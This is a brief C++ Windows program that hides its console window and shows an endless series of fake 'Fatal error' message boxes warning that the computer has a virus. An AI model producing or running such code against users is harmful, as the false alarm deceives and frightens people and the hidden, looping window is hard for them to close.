#include <iostream>
#include <windows.h>

int main() {
while (true) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    MessageBox(NULL, L"Fatal error", L"May your computer has virus!", MB_ICONERROR | MB_OK);
    }
}



